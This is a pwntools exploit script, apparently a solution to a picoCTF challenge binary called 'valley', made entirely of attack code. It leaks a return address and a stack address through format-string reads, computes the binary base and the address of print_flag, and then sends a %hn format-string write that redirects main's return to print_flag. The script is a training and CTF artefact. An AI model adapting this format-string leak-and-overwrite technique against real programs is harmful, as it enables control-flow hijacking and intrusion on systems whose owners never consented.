import pwn

gdbscript = """
    tbreak main
    continue
"""

e = pwn.ELF("./valley")
p = pwn.remote("shape-facility.picoctf.net", 59859)
#p = pwn.process("./valley")
#p = pwn.gdb.debug("./valley", gdbscript=gdbscript)

print_flag_off = e.symbols["print_flag"]

p.sendline(b"%21$llx")
p.recvuntil(b"You heard in the distance: ")
main_ret_addr = int(p.recvline()[:-1].decode("utf-8"), 16)

base_addr = main_ret_addr - 0x1413
print_flag_addr = base_addr + print_flag_off

p.sendline(b"%20$llx")
p.recvuntil(b"You heard in the distance: ")
stack_leak = int(p.recvline()[:-1].decode("utf-8"), 16)
ret_location = stack_leak - 8

print(f"main ret addr: {hex(main_ret_addr)}")
print(f"base addr: {hex(base_addr)}")
print(f"print flag addr: {hex(print_flag_addr)}")
print(f"stack leak: {hex(stack_leak)}")
print(f"ret location: {hex(ret_location)}")

# Only need to write lower 16 bits since upper 48 bits stay the same
pad = print_flag_addr & 0xFFFF

s = b"%6$" + str(pad).encode("utf-8") + b"p"
s += b"%8$hn"
a_pad = 16 - len(s)
assert(a_pad >= 0)

s = b"A"*a_pad + b"%6$" + str(pad - a_pad).encode("utf-8") + b"p%8$hn"
s += pwn.p64(ret_location)

print(s)
p.sendline(s)
p.sendline("exit")
print(p.recvall(timeout=2))
